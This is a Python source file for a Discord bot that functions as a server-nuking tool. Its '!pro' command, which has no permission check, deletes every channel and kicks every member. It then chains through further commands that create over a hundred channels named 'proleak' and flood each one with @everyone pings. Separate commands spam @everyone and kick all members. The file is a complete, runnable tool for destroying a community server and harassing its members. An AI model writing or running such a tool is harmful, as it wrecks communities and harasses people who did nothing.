import discord
from discord.ext import commands
import asyncio

TOKEN = 'YOUR_BOT_TOKEN_HERE'

intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user}')

async def clear_guild(guild):
    delete_tasks = [
        channel.delete() for channel in guild.channels
    ]
    kick_tasks = [
        member.kick(reason="Clearing guild") for member in guild.members if member != bot.user
    ]
    await asyncio.gather(*delete_tasks, *kick_tasks)

@bot.command()
async def pro(ctx):
    guild = ctx.guild
    await clear_guild(guild)
    
    channels = await asyncio.gather(
        *[guild.create_text_channel('proleak') for _ in range(12)]
    )
    await send_mass_messages(channels, 5)
    await asyncio.sleep(1)
    await pros(ctx)

@bot.command()
async def pros(ctx):
    guild = ctx.guild
    channels = await asyncio.gather(
        *[guild.create_text_channel('proleak') for _ in range(20)]
    )
    await send_mass_messages(channels, 10)
    await asyncio.sleep(1)
    await pross(ctx)

@bot.command()
async def pross(ctx):
    guild = ctx.guild
    channels = await asyncio.gather(
        *[guild.create_text_channel('proleak') for _ in range(20)]
    )
    await send_mass_messages(channels, 10)
    await asyncio.sleep(1)
    await prosss(ctx)

@bot.command()
async def prosss(ctx):
    guild = ctx.guild
    channels = await asyncio.gather(
        *[guild.create_text_channel('proleak') for _ in range(20)]
    )
    await send_mass_messages(channels, 10)
    await asyncio.sleep(1)
    await proleak(ctx)

@bot.command()
async def proleak(ctx):
    guild = ctx.guild
    channels = await asyncio.gather(
        *[guild.create_text_channel('proleak') for _ in range(40)]
    )
    await send_mass_messages(channels, 10)

async def send_mass_messages(channels, repeat_count):
    send_tasks = [
        channel.send('@everyone') for channel in channels for _ in range(repeat_count)
    ]
    await asyncio.gather(*send_tasks)

@bot.command()
async def mess(ctx):
    async def send_hello(channel):
        for _ in range(40):
            await channel.send("@everyone")

    if ctx.message.channel.type == discord.ChannelType.voice:
        await send_hello(ctx.message.channel)
    else:
        await send_hello(ctx.channel)

@bot.command()
@commands.has_permissions(administrator=True)
async def kickall(ctx):
    guild = ctx.guild
    kick_tasks = [
        member.kick(reason="Kicked") for member in guild.members if member != bot.user
    ]
    await asyncio.gather(*kick_tasks)

if __name__ == "__main__":
    bot.run(TOKEN)